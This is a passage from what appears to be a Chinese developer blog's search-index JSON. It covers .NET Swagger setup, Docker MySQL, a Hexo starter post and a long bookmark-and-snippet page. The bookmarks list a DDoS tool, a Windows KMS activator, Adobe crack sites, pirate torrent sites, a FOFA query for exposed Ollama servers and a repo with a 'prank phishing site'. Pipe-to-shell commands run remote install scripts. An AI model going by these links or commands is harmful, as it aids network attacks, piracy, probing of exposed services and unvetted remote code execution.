即接口没问题\n","permalink":"https://qfsyso.github.io/posts/.net-swagger/","summary":"开发环境 Win10 VS2022 .NET8.0\n1.从NuGet添加Swagger ​\n在解决方案资源管理器中右键单击项目\u0026gt;管理 NuGet 包 将包源设置为“nuget.org” 确保启用“包括预发行”选项 在搜索框中输入“Swashbuckle.AspNetCore” 从“浏览”选项卡中选择最新的“Swashbuckle.AspNetCore”包，然后单击“安装”\n2.将 Swagger 生成器添加到以下位置的服务集合中Program.cs： builder.Services.AddControllers(); builder.Services.AddEndpointsApiExplorer(); builder.Services.AddSwaggerGen(); ​\n启用中间件 生成\napp.UseSwagger(); app.UseSwaggerUI(); app.UseSwaggerUI(options =\u0026gt; { options.SwaggerEndpoint(\u0026#34;/swagger/v1/swagger.json\u0026#34;, \u0026#34;v1\u0026#34;); options.RoutePrefix = string.Empty; }); ​\n3.添加API控制器 创建api\n// GET api/\u0026lt;myapi\u0026gt;/5 /// \u0026lt;summary\u0026gt; /// getid /// \u0026lt;/summary\u0026gt; /// \u0026lt;param name=\u0026#34;id\u0026#34;\u0026gt;id参数\u0026lt;/param\u0026gt; /// \u0026lt;returns\u0026gt;valuestr\u0026lt;/returns\u0026gt; [HttpGet(\u0026#34;{id}\u0026#34;)] public string Get(int id) { return \u0026#34;value\u0026#34; + id; } // POST api/\u0026lt;myapi\u0026gt; [HttpPost] public string Post([FromBody] string value) { //post逻辑代码 return \u0026#34;myPost\u0026#34;; } // PUT api/\u0026lt;myapi\u0026gt;/5 [HttpPut(\u0026#34;{id}\u0026#34;)] public string Put(int id, [FromBody] string value) { //put逻辑代码 return \u0026#34;myPut\u0026#34;; } // DELETE api/\u0026lt;myapi\u0026gt;/5 [HttpDelete(\u0026#34;{id}\u0026#34;)] public string Delete(int id) { //delete逻辑代码 return \u0026#34;myDelete\u0026#34;; } ​","title":".NET Swagger "},{"content":"1.下载docker desktop https://www.docker.com/products/docker-desktop/\n创建容器 docker run 创建并启动mysql容器\n\u0026ndash;name 容器名字\n-d 后台运行容器\n-p 映射端口\n-e 参数\n截至目前最新的mysql是mysql8.0.36 那就整这个试下。\ndocker run -d --name mysql-container -e TZ=UTC -p 30306:3306 -e MYSQL_ROOT_PASSWORD=你的密码 mysql:8.0.36-debian ​\n等待一会，看到mysql已经pull下来。\n回到docker看到容器已经创建。\n​\n​\n可以输入docker images查看\n​\n3.创建mysql数据库管理软件容器\ndocker run --name myadmin -d --link mysql-container:db -p 8880:80 phpmyadmin/phpmyadmin ​\n回到docker查看下容器是否创建成功。 ​\n复制地址到浏览器访问。 ​\n​\nokok\n唉哟不错哦~\n扩展：ubuntu版本\ndocker run -d --name mysql-container -e TZ=UTC -p 30306:3306 -e MYSQL_ROOT_PASSWORD=xxxxxx ubuntu/mysql:8.0-22.04_beta https://hub.docker.com/r/ubuntu/mysql?uuid=D64B1F2A-A81A-4D2C-B66B-FCFAECE77EFE\n","permalink":"https://qfsyso.github.io/posts/docker-mysql/","summary":"1.下载docker desktop https://www.docker.com/products/docker-desktop/\n创建容器 docker run 创建并启动mysql容器\n\u0026ndash;name 容器名字\n-d 后台运行容器\n-p 映射端口\n-e 参数\n截至目前最新的mysql是mysql8.0.36 那就整这个试下。\ndocker run -d --name mysql-container -e TZ=UTC -p 30306:3306 -e MYSQL_ROOT_PASSWORD=你的密码 mysql:8.0.36-debian ​\n等待一会，看到mysql已经pull下来。\n回到docker看到容器已经创建。\n​\n​\n可以输入docker images查看\n​\n3.创建mysql数据库管理软件容器\ndocker run --name myadmin -d --link mysql-container:db -p 8880:80 phpmyadmin/phpmyadmin ​\n回到docker查看下容器是否创建成功。 ​\n复制地址到浏览器访问。 ​\n​\nokok\n唉哟不错哦~\n扩展：ubuntu版本\ndocker run -d --name mysql-container -e TZ=UTC -p 30306:3306 -e MYSQL_ROOT_PASSWORD=xxxxxx ubuntu/mysql:8.0-22.04_beta https://hub.docker.com/r/ubuntu/mysql?uuid=D64B1F2A-A81A-4D2C-B66B-FCFAECE77EFE","title":"Docker MySQL "},{"content":" Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick Start Create a new post npm install hexo-cli -g hexo init blog cd blog npm install hexo server $ hexo new \u0026#34;My New Post\u0026#34; More info: Writing\nRun server $ hexo server More info: Server\nGenerate static files $ hexo generate More info: Generating\nDeploy to remote sites $ hexo deploy More info: Deployment\n","permalink":"https://qfsyso.github.io/posts/hello-world-hexo/","summary":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick Start Create a new post npm install hexo-cli -g hexo init blog cd blog npm install hexo server $ hexo new \u0026#34;My New Post\u0026#34; More info: Writing\nRun server $ hexo server More info: Server","title":"Hello World Hexo"},{"content":"now study 开发者活动 https://developer.huaweicloud.com/events\n云学堂 https://edu.huaweicloud.com/signup/a84b127961f4408bb69d560f48c5675d\n华为云认证 https://edu.huaweicloud.com/certificationindex\n开发者空间学习 https://developer.huaweicloud.com/space/devportal/knowledge\nhttps://linux.do/t/topic/665547/1 华为云认真攻略\nAES-256 加密算法和三重转轮混淆技术\n10个人 2m 100 20m\n瘦肚子 胯下击掌 50 单侧提膝 50 提膝下压 50 深蹲 30 4组\nsomething git github镜像网站入口1：https://bgithub.xyz/ github镜像网站入口3：https://kkgithub.com/ github镜像网站入口5：https://gitclone.com/ github镜像网站入口6：https://g.nite07.org https://github.cmliussss.net/\nchatbox https://github.com/Bin-Huang/chatbox Desktop Client App for AI Models/LLMs (GPT, Claude, Gemini, Ollama\u0026hellip;)\nfofa https://fofa.info/ app=\u0026ldquo;Ollama\u0026rdquo; \u0026amp;\u0026amp; is_domain=false https://github.com/ollama/ollama/blob/main/docs/api.md\ndbeaver sql工具 https://github.com/dbeaver/dbeaver/releases\nsing-boxyg https://github.com/yonggekkk/sing-box-yg\nmusic-desktop https://github.com/lyswhut/lx-music-desktop\nRDP、VNC、SSH 远程 https://github.com/mRemoteNG/mRemoteNG\ngeekgeekrun https://github.com/geekgeekrun/geekgeekrun\nclash linux https://github.com/Elegycloud/clash-for-linux-backup\nssh https://github.com/cmliu/webssh https://github.com/chaos-zhu/easynode https://github.com/crazypeace/huashengdun-webssh https://github.com/huashengdun/webssh https://github.com/Jrohy/webssh\ndocker run -d --name webssh --restart always -p 18888:8888 cmliu/webssh:latest v2rayN https://github.com/2dust/v2rayN/\nClashX.Meta https://github.com/MetaCubeX/ClashX.Meta/tree/meta\nAssetBundle工具 解压uti .bundle 文件 https://github.com/Perfare/AssetStudio/releases\nw-pdf https://github.com/CalyPdf/Caly/releases\nwx-ocr https://github.com/golangboy/wxocrs\nfrp https://github.com/fatedier/frp\nmpvplaer https://github.com/mpvnet-player/mpv.net\nh5 game https://github.com/hackycy/h5-game-collection\nwin激活 https://github.com/zbezj/HEU_KMS_Activator\ntwitter awe https://github.com/DennisThink/awesome_twitter_CN?tab=readme-ov-file\nLibreTV 媒体库 https://github.com/LibreSpark/LibreTV\nsherpa-onnx tts stt https://github.com/k2-fsa/sherpa-onnx\npyvideotrans 视频字幕翻译 https://github.com/jianchang512/pyvideotrans\nChatTTS https://github.com/2noise/ChatTTS\ncoqui TTS https://github.com/coqui-ai/TTS TTS\nTest Speed https://github.com/openspeedtest/Speed-Test https://github.com/MortyFx/speedtest-x https://github.com/librespeed/speedtest\nPandaWiki AI知识库 https://github.com/chaitin/PandaWiki\nBiliNote AI 视频笔记生成工具 https://github.com/JefferyHcool/BiliNote\nKPrompt https://github.com/KuekHaoYang/KPrompt\nkoemusic https://github.com/iAJue/MoeKoeMusic\nWi-FiCam DroidCam ，Iriun Webcam\nmoments 极简朋友圈 https://github.com/kingwrcy/moments\n小说下载 https://github.com/Idea-flow/novel-download\ndocker pull ideaflow1/novel-download:latest docker run -p 30000:30000 --name ideaflow1-novel-download \\-v /ideaflowNovelDownload/download:/app/download \\ -v /ideaflowNovelDownload/db:/app/db \\ -v /ideaflowNovelDownload/logs:/app/logs \\ -d ideaflow1/novel-download:latest asteroid https://github.com/asteroid-team/asteroid\nepub阅读 Koodo Reader https://github.com/koodo-reader/koodo-reader KOReader https://github.com/koreader/koreader EpubReader https://github.com/mignaway/EpubReader Thorium Reader https://github.com/edrlab/thorium-reader Foliate https://github.com/johnfactotum/foliate Calibre-Web https://github.com/janeczku/calibre-web Readium https://github.com/readium/readium-js-viewer Bookworm https://github.com/babluboy/bookworm\ndockerbackup https://github.com/shuguangnet/docker_backup_script\nawssome dk https://github.com/awesome-selfhosted/awesome-selfhosted\ndocker-wx https://github.com/RICwang/docker-wechat\nStirling-PDF PDF 处理 https://github.com/Stirling-Tools/Stirling-PDF\ngpt-sovits https://github.com/RVC-Boss/GPT-SoVITS\nmRemoteNG 集成多协议的远程连接管理工具 https://github.com/mRemoteNG/mRemoteNG\n烟花源码 https://github.com/NianBroken/Firework_Simulator\n烟花生日源码 https://github.com/louislivi/fireworks\nddos https://github.com/sammwyy/MikuMikuBeam\nSamWaf防火墙 开源的轻量级 Web 应用防火墙 https://github.com/samwafgo/SamWaf\nAndEggs 安卓彩蛋 https://github.com/hushenghao/AndroidEasterEggs\nVue-ElPlus-Admin 通用Vue后台 https://github.com/zanjiahao/Vue-ElPlus-Admin\nChatGPT/Gemini A cross-platform ChatGPT/Gemini UI (Web / PWA / Linux / Win / MacOS). 一键拥有你自己的跨平台 ChatGPT/Gemini 应用 https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web\nScreenToGif allows you to record a selected area of your screen, edit and save it as a gif or video. https://github.com/NickeManarin/ScreenToGif\nhacker-scripts https://github.com/NARKOZ/hacker-scripts\nawesome-dotnet A collection of awesome .NET core libraries, tools, frameworks and software https://github.com/thangchung/awesome-dotnet-core\nDotNetGuide 面向.NET开发者的开源技术社区 https://github.com/YSGStudyHards/DotNetGuide\nisply 反编译 dll exe https://github.com/isply\nWinSCP a popular free SFTP and FTP client for Windows https://github.com/winscp/winscp\nmediasoup Cutting Edge WebRTC Video Conferencing https://github.com/versatica/mediasoup-demo\nprotobuf-net Protocol Buffers library for idiomatic .NET https://github.com/protobuf-net/protobuf-net\nDotNettySocket An Easy Socket(TcpSocket,WebSocket,UdpSocket) Framework Based On DotNetty https://github.com/Coldairarrow/DotNettySocket\nYOLO11 基于深度学习和计算机视觉领域的尖端技术 https://docs.ultralytics.com/ https://github.com/ultralytics/ultralytics https://github.com/angery/yolov11demo\n.NET CORE 代码生成器 Web中使用CodeFirst模式， 实体 生成器，UI代码 生成器，在线建表，PostgresSql生成器，达梦生成器，金仓生成器MySql生成器，SQLServere生成器、Oracle生成器、Sqlite生成器、导出文档，模版配置， WEB代码生成器 ，API代码生成器 https://github.com/DotNetNext/WebFirst\njimengapi https://github.com/LLM-Red-Team/jimeng-free-api\n开源note https://gitee.com/cxasm/notepad--\n大屏数据 https://gitee.com/lvyeyou/DaShuJuZhiDaPingZhanShi\nhello-cangjie https://github.com/open-cangjie/hello-cangjie\nnginx-ui https://github.com/0xJacky/nginx-ui\nweekly https://github.com/Geekhyt/weekly https://github.com/ruanyf/weekly https://github.com/ljinkai/weekly\nKscan go开发的全方位扫描器， https://github.com/lcvvvv/kscan\npython3源码 12306抢票，excel操作，json操作，request操作，zip操作，下班倒计时，从零学Python-掘金活动，图灵机器人聊天，处理Excel数据原表保存，处理Excel表格数据，微信点赞刷票，恶搞钓鱼网站，抓取IP地址，拼接表格单行数据为字符串，爬取Boss直聘数据，王者荣耀皮肤爬图，百思图片视频，省市区三级地址json-mysql，省市区三级地址库，省市区乡村五级地址库，省市区镇四级地址库，自动生成数据库表字典的markdown文本，自动登陆邮箱，英雄联盟皮肤爬图，贴吧-内涵段子，跳板机连接mysql，远程服务器下载文件 https://github.com/gxcuizy/Python\nAwesome LLMs In China 中文大模型 https://github.com/wgwang/awesome-LLMs-In-China\nDeep-Live-Cam Real-time face swap and video deepfake with a single click and only a single image. https://github.com/hacksider/Deep-Live-Cam\nawesome-avalonia A collection of interesting libraries and tools for Avalonia project. https://github.com/AvaloniaCommunity/awesome-avalonia\nMachine Learning for all https://github.com/microsoft/ML-For-Beginners\nSunnyUI.NET 基于.NET Framework 4.0+、.NET6、.NET8、.NET9 框架的 C# WinForm UI、开源控件库、工具类库、扩展类库、多页面开发框架。 https://gitee.com/yhuse/SunnyUI\nflutter-chatbot https://github.com/fanenr/flutter-chatbot\nim mobile https://github.com/DWHengr/linyu_mobile pc https://github.com/DWHengr/linyu-client server https://github.com/DWHengr/linyu-server\nlazy-captcha .NET验证码 https://gitee.com/pojianbing/lazy-captcha\n隐写 jpg png add text file https://github.com/kingthy/imagemask\nsomelink something link\n夸克搜 https://www.zhongchuangwl.com/\n2FA two-factor authentication https://chromewebstore.google.com/detail/authenticator/bhghoamapcdpbohphigoooaddinpkbai\nF2A https://github.com/simular/authman-app\nhellogithub https://hellogithub.com/\n临时邮箱 https://tmpmails.com/zh\nwebtool https://www.w3cschool.cn/tools\n夸克盘搜索 https://mizixing.com/?p=7749\ngoogle ide https://idx.google.com/\n图片素材 https://pixabay.com/\nwin win系统 山已几子木： https://msdn.sjjzm.com/win11.html HelloWindows：https://hellowindows.cn/ MSDN：https://next.itellyou.cn/Original/ https://www.microsoft.com/zh-cn/windows?r=1\ngvp https://gitee.com/explore\n热榜 https://tophub.today/\n热榜 https://rebang.today\nmacapp https://macked.app\nxmac-app https://xmac.app/\nIOS-IPA AppCake：https://www.iphonecake.com/ iPASTORE：https://ipastore.me/ TweakBox：https://www.tweakboxapp.com/ AppValley：https://appvalley.vip/ TuTuApp：https://tutuapp.vip/ Panda Helper：https://www.pandahelp.vip/ Ignition：https://ignition.fun/ CokernutX：https://www.cokernutx.com/ AltStore：https://altstore.io/ iOS Haven：https://ioshaven.co/\nlinuxdo geminipro https://linux.do/discourse-ai/ai-bot/conversations\ngemini nohk https://gemini.google.com/deepresearch\ngoogle插件DeepSider 几个磁力搜索网站 黑马磁力：https://heimaai.top 磁力多：https://ug.cilido.top 磁力搜索：https://so.btgpt.net 搜番：https://sc.sefan.cc 磁力星球：https://so2.xingqiu.icu\n国外几个比较出名的磁力搜索站 BT4G：https://bt4gprx.com MagnetDL：https://magnetdl.com eztvx：https://eztvx.to 1377X：https://1337x.to The Pirate Bay ：https://thepiratebay.org/index.html\n几个磁力下载工具 迅雷：不解释，国内迅雷用户最多，并且垄断大部分资源。\nMotrix：一个全能型下载管理器，支持 HTTP、FTP、BitTorrent、Magnet 等协议。界面美观，使用简单。 https://motrix.app\nqBittorrent：老牌开源的 BitTorrent 客户端，qBittorrent 以其速度快、稳定性高、支持 Unicode 编码以及提供多种功能而受到好评。 https://qbittorrent.org\nqBittorrent增强版：可以订阅并自动更新Tracker地址以及可以屏蔽迅雷，也就是BT玩家口中说的”反吸血“功能。 https://github.com/c0re100/qBittorrent-Enhanced-Edition/releases\nFree Download Manager (FDM) ：支持 Windows、macOS、Android 和 Linux 操作系统。它可以加速所有类型的下载，支持视频下载和种子下载，提供代理支持，并支持 HTTP/HTTPS/FTP/BitTorrent 协议。 https://freedownloadmanager.org/zh/\n注：如果种子或者磁力来自国内，用迅雷。种子或磁力来自国外用后面几个，如果学习资料下载速度慢多半是冷门老师的学习资料。\n几个视频下载工具 很多平台尤其推特有很多优质的“学习资料”，你可以通过复制你想看的“学习资料”的链接到如下工具网站就可以完成下载，非常方便。\nparsevideo ：支持优酷、搜狐、腾讯、芒果、B站、梨视频、微博、头条、抖音、微视、快手、Ins、Tumblr、Twitter https://parsevideo.com\nsuperparse：支持在线解析并下载视频,支持YouTube, Instagram, Facebook, Twitter ，甚至是那些个网站。 https://superparse.com\nInstarg：支持解析下载多平台视频 https://instagram.iiilab.com\nYVideo Downloader：从 youtube、instagram、facebook、bilibili 、twitter、抖音等网站下载视频，支持批量下载 https://yvideo.top\ntwitter视频下载：为twitter而生，好用的视频下载小工具。 https://twitterxz.com\n国外热榜中文对 https://www.buzzing.cc/\n开发文章推荐 daily.dev\nproduct hunt 每日最佳产品 https://www.producthunt.com/\ntechurl https://techurls.com/\n设计礼包 https://linux.do/t/topic/531689\nmac app 这个是国内mac破解 Adobe破解 https://macked.app/ Adobe 下载 配合macke的adobe activation tool https://github.com/X1a0He/Adobe-Downloader\nbtc 价格 https://www.tradingview.com/markets/cryptocurrencies/prices-all/\nDD WIN10 DD WIN10\nLinux环境部署：\ncurl -O https://gitlab.com/bin456789/reinstall/-/raw/main/reinstall.sh || wget -O reinstall.sh $_ bash reinstall.sh dd \u0026ndash;img https://www.xiecloud.cn/d/Share/DDSystem/Win10_22H2.vhd.gz Windows环境部署：\ncertutil -urlcache -f -split https://gitlab.com/bin456789/reinstall/-/raw/main/reinstall.bat .\\reinstall.bat dd \u0026ndash;img https://www.xiecloud.cn/d/Share/DDSystem/Win10_22H2.vhd.gz 账户：Administrator 密码：Hostloc.com\nDD成功系统后请手动在CMD运行： net accounts /lockoutthreshold:0可禁用账户锁定。\n放假假日 https://holidays-calendar.net/calendar_zh_cn/china_zh_cn.html\ngoogle翻译文档 https://translate.google.com/?hl=zh-cn\u0026amp;sl=zh-CN\u0026amp;tl=zh-TW\u0026amp;op=docs\n修剪MP3 https://audiotrimmer.com/cn\nico制作 https://www.bitbug.net\nAI万花筒 https://www.aiwht.com/\n在线工具 https://www.67tool.com/\naliyun网络测试 https://boce.aliyun.com/detect/dns\necs测试脚本 sh https://github.com/spiritLHLS/ecs\nu盘启动 小米笔记本 F12/del 微星笔记本 F8\napple排行 https://apps.apple.com/hk/charts/iphone/top-free-appd/36\n工具 vvv https://github.com/selierlin/Share-SSR-V2ray https://github.com/2dust/v2rayN\n王者皮肤 https://pvp.qq.com/web201605/wallpaper.shtml\nMP3 DL https://3g.gljlw.com/music/wy/ 网易云 机领网下载MP3 https://github.com/jitwxs/163MusicLyrics http://www.qeecc.com/\nsearch music http://www.xmsj.org/ 音乐搜索器 - 多站合一音乐搜索,音乐\nreddit https://www.reddit.com/r/webdev/ https://www.reddit.com/r/programming/ https://www.reddit.com/r/devops/ https://www.reddit.com/r/LocalLLaMA/\n购物查价 https://tool.manmanbuy.com/HistoryLowest.aspx\nsomegame 红警2共和国 https://modelgood.com/5944.html\n红警2对战 https://www.ra2ol.com/\n11game https://war3.5211game.com/\nkk https://www.kkdzpt.com/\nup https://patch.ali213.net/showpatch/209293.html\nother skills server test curl https://raw.githubusercontent.com/zhanghanyun/backtrace/main/install.sh -sSf | sh 要判断是不是套了cf 要判断是不是套了cf，可以在网址后面加/cdn-cgi/trace 有页面就是套了cf 上面也会显示你访问用的ip https://chat.openai.com/cdn-cgi/trace\ncss 背景渐变 background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d); img居中 img标签在HTML页面中居中显示，可以采用以下几种方法：\n‌一、水平居中‌ ‌使用text-align属性‌：\n给img的父元素设置text-align: center;，这样img标签就会继承这个属性，实现水平居中的效果‌12。 ‌使用margin属性‌：\n给img标签设置margin-left: auto;和margin-right: auto;，并添加display: block;，这样img标签就会自动计算左右两边的空间，使得它在水平方向上居中‌12。 ‌使用flex布局‌：\n给img的父元素设置display: flex;和justify-content: center;，这样img标签就会在父元素的水平方向上居中‌12。\n‌二、垂直居中‌ ‌使用flex布局‌：\n给包裹img的父元素设置display: flex;和align-items: center;，即可实现垂直居中‌45。 ‌使用display: table;‌：\n给父元素设置display: table;，给子元素（即包裹img的容器）设置display: table-cell;和vertical-align: middle;，即可实现垂直居中‌4。 ‌使用绝对定位‌：\n通过绝对定位的方式，结合top、left、transform等属性，也可以实现img的垂直居中，但这种方法需要更精细的布局控制‌4。 根据实际需求，可以选择适合的方法来实现img标签的居中显示。\nc# csharp swagger hide 使用 [ApiExplorerSettings] 特性 在接口方法上添加 [ApiExplorerSettings(IgnoreApi = true)] 特性，这会让 Swagger 忽略该接口，但接口仍然可以被正常访问。\n[HttpGet(\u0026ldquo;hidden\u0026rdquo;)] 则完全去掉\nc# email regex 正则校验 string pattern = @\u0026#34;^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+$\u0026#34;; Regex regex = new Regex(pattern); if (!regex.IsMatch(email)) { trsm.msg = localizer.GetString(\u0026#34;UStatus2\u0026#34;).Value;//s2 jsrs = JsonConvert.SerializeObject(trsm); return jsrs; } 驼峰/下划线转换策略 Swagger 显示的是 sort_id, sort_int, user_id，这是因为 ASP.NET Core 默认使用 System.Text.Json 或 Newtonsoft.Json 时，字段名会经过驼峰/下划线转换策略。\n常见原因： API默认命名策略 (NamingPolicy) 在 ASP.NET Core 3.0+，System.Text.Json 默认使用 camelCase，但是如果你在 Startup.cs 或 Program.cs 里配置过 SnakeCaseNamingStrategy，就会变成下划线格式。\n解决 全局修改命名策略\n如果你想让所有 API 都保持原始 PascalCase，可以在 Program.cs 或 Startup.cs 里配置：\nSystem.Text.Json:\nbuilder.Services.AddControllers() .AddJsonOptions(options =\u0026gt; { options.JsonSerializerOptions.PropertyNamingPolicy = null; }); Newtonsoft.Json:\nservices.AddControllers() .AddNewtonsoftJson(options =\u0026gt; { options.SerializerSettings.ContractResolver = new DefaultContractResolver { NamingStrategy = null // 不用 CamelCase 或 SnakeCase }; }); ts/js 时分秒格式化 const formatStatus01 = (status1: string) =\u0026gt; { switch (status1) { case \u0026lsquo;0.0\u0026rsquo;: return \u0026lsquo;关闭\u0026rsquo; case \u0026lsquo;0\u0026rsquo;: return \u0026lsquo;关闭\u0026rsquo; default: const seconds = parseInt(status1, 10) if (isNaN(seconds)) { return status1 } if (seconds === 0) { return \u0026lsquo;实时\u0026rsquo; } const hours = Math.floor(seconds / 3600) const minutes = Math.floor((seconds % 3600) / 60) const remainingSeconds = seconds % 60\nif (hours \u0026gt; 0) { return `${hours}小时${minutes \u0026gt; 0 ? `${minutes}分钟` : ''}` } else if (minutes \u0026gt; 0) { return `${minutes}分钟` } else { return `${remainingSeconds}秒` } } }\nvue3三元 三元运算符\n\u0026lt;span style=\u0026#34;float: left\u0026#34;\u0026gt;{{ item.UserName || \u0026#39;已注销\u0026#39; }}\u0026lt;/span\u0026gt; 如果item.UserName为假值（空字符串、null、undefined等），自动回退显示“已注销”。\njs time [] function isValidTimeRange(timeRange) { // 去除字符串两端的空白字符 timeRange = timeRange.trim(); // 如果是空字符串，返回false if (!timeRange) return false; // 分割多个时间段 const ranges = timeRange.split(\u0026#39;,\u0026#39;); // 时间格式正则表达式 const timeFormat = /^([01]\\d|2[0-3]):([0-5]\\d)-([01]\\d|2[0-3]):([0-5]\\d)$/; // 检查每个时间段 for (const range of ranges) { const trimmedRange = range.trim(); // 检查格式是否匹配 if (!timeFormat.test(trimmedRange)) { return false; } // 提取开始和结束时间 const [start, end] = trimmedRange.split(\u0026#39;-\u0026#39;); const [startHours, startMinutes] = start.split(\u0026#39;:\u0026#39;).map(Number); const [endHours, endMinutes] = end.split(\u0026#39;:\u0026#39;).map(Number); // 检查开始时间是否小于结束时间 if (startHours \u0026gt; endHours || (startHours === endHours \u0026amp;\u0026amp; startMinutes \u0026gt;= endMinutes)) { return false; } } return true; } // 示例用法 console.log(isValidTimeRange(\u0026#34;00:00-12:26\u0026#34;)); // true console.log(isValidTimeRange(\u0026#34;00:00-12:30,13:30-23:59\u0026#34;)); // true console.log(isValidTimeRange(\u0026#34;00:00-23:59\u0026#34;)); // true console.log(isValidTimeRange(\u0026#34;00:00-25:00\u0026#34;)); // false (无效的小时) console.log(isValidTimeRange(\u0026#34;00:00-12:60\u0026#34;)); // false (无效的分钟) console.log(isValidTimeRange(\u0026#34;12:30-00:00\u0026#34;)); // false (开始时间大于结束时间) console.log(isValidTimeRange(\u0026#34;00:00-12:30,13:30-22:59,23:00-23:59\u0026#34;)); // true console.log(isValidTimeRange(\u0026#34;00:00-12:30,13:30\u0026#34;)); // false (格式错误) 防止html f12 查看 \u0026lt;script\u0026gt; // 禁用常见快捷键（F12、Ctrl+Shift+I、Ctrl+U、Ctrl+Shift+C 等） document.addEventListener(\u0026#39;keydown\u0026#39;, function(e) { // F12 if (e.key === \u0026#39;F12\u0026#39;) { e.preventDefault(); return false; } // Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+Shift+C if (e.ctrlKey \u0026amp;\u0026amp; e.shiftKey \u0026amp;\u0026amp; (e.key === \u0026#39;I\u0026#39; || e.key === \u0026#39;J\u0026#39; || e.key === \u0026#39;C\u0026#39;)) { e.preventDefault(); return false; } // Ctrl+U (查看源代码) if (e.ctrlKey \u0026amp;\u0026amp; e.key === \u0026#39;u\u0026#39;) { e.preventDefault(); return false; } // Ctrl+S (防止保存), Ctrl+P (打印) if (e.ctrlKey \u0026amp;\u0026amp; (e.key === \u0026#39;s\u0026#39; || e.key === \u0026#39;p\u0026#39;)) { e.preventDefault(); return false; } }); // 禁用右键菜单 document.addEventListener(\u0026#39;contextmenu\u0026#39;, function(e){ e.preventDefault(); }); // 尝试检测 DevTools（基于时间差或被重写的 console 特性） // 警告：这类检测不可靠，浏览器或扩展可绕过 (function detectDevTools() { let opened = false; const threshold = 160; const check = function() { const start = new Date(); debugger; // 触发时会显著增加耗时（不是所有环境都有效） const end = new Date(); if (end - start \u0026gt; threshold) { if (!opened) { opened = true; onDevToolsDetected(); } } else { opened = false; } }; function onDevToolsDetected() { // 可选动作：重定向、遮罩、清空页面等（小心影响用户体验） // window.location.href = \u0026#39;about:blank\u0026#39;; // document.body.innerHTML = \u0026#39;\u0026lt;h1\u0026gt;检测到开发者工具，页面已保护\u0026lt;/h1\u0026gt;\u0026#39;; console.warn(\u0026#39;DevTools detected — action could be taken here\u0026#39;); } setInterval(check, 1500); })(); // 频繁清除 clipboard / 禁止选择（提高查看源码难度） document.addEventListener(\u0026#39;selectstart\u0026#39;, (e) =\u0026gt; e.preventDefault()); document.addEventListener(\u0026#39;copy\u0026#39;, (e) =\u0026gt; e.preventDefault()); // 可选：把重要逻辑放在外部请求的接口里（更安全的建议见下） \u0026lt;/script\u0026gt; js world time \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Time Zones Display\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { font-family: Arial, sans-serif; } div { margin-bottom: 10px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt;北京时间: \u0026lt;span id=\u0026#34;beijingTime\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;东京时间: \u0026lt;span id=\u0026#34;tokyoTime\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;欧洲-巴黎时间: \u0026lt;span id=\u0026#34;parisTime\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;英国-伦敦时间: \u0026lt;span id=\u0026#34;londonTime\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;美东-纽约时间: \u0026lt;span id=\u0026#34;newYorkTime\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;美西-洛杉矶时间: \u0026lt;span id=\u0026#34;losAngelesTime\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;UTC时间: \u0026lt;span id=\u0026#34;utcTime\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; // 定义各个时区相对UTC的偏移量（单位：小时），考虑夏令时情况设置不同偏移量范围 const timeZoneOffsets = { \u0026#39;beijing\u0026#39;: 8, // 北京不实行夏令时，固定偏移8小时 \u0026#39;tokyo\u0026#39;: 9, // 东京不实行夏令时，固定偏移9小时 \u0026#39;paris\u0026#39;: [1, 2], // 巴黎实行夏令时，冬令时偏移1小时，夏令时偏移2小时（示例简化处理，实际更复杂） \u0026#39;london\u0026#39;: [0, 1], // 伦敦实行夏令时，冬令时偏移0小时，夏令时偏移1小时 \u0026#39;newYork\u0026#39;: [-5, -4], // 纽约实行夏令时，冬令时偏移-5小时，夏令时偏移-4小时 \u0026#39;losAngeles\u0026#39;: [-8, -7] // 洛杉矶实行夏令时，冬令时偏移-8小时，夏令时偏移-7小时 }; function padZero(num) { return num \u0026lt; 10? \u0026#39;0\u0026#39; + num : num; } function formatTime(date) { const year = date.getFullYear(); const month = padZero(date.getMonth() + 1); const day = padZero(date.getDate()); const hours = padZero(date.getHours()); const minutes = padZero(date.getMinutes()); const seconds = padZero(date.getSeconds()); return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`; } function isDaylightSavingTime(date, zone) { const month = date.getMonth(); const dstStart = new Date(date.getFullYear(), 3, 8, 2, 0, 0); // 假设每年4月8日凌晨2点开始夏令时（简化示例，实际不同地区规则差异大） const dstEnd = new Date(date.getFullYear(), 10, 1, 2, 0, 0); // 假设每年10月1日凌晨2点结束夏令时 if (zone === \u0026#39;paris\u0026#39; || zone === \u0026#39;london\u0026#39; || zone === \u0026#39;newYork\u0026#39; || zone === \u0026#39;losAngeles\u0026#39;) { return date \u0026gt;= dstStart \u0026amp;\u0026amp; date \u0026lt; dstEnd; } return false; } function updateTime() { const now = new Date(); const utcDate = new Date(now.getUTCFullYear(), now.getUTCMonth(), now.getUTCDate(), now.getUTCHours(), now.getUTCMinutes(), now.getUTCSeconds()); const utcTime = formatTime(utcDate); 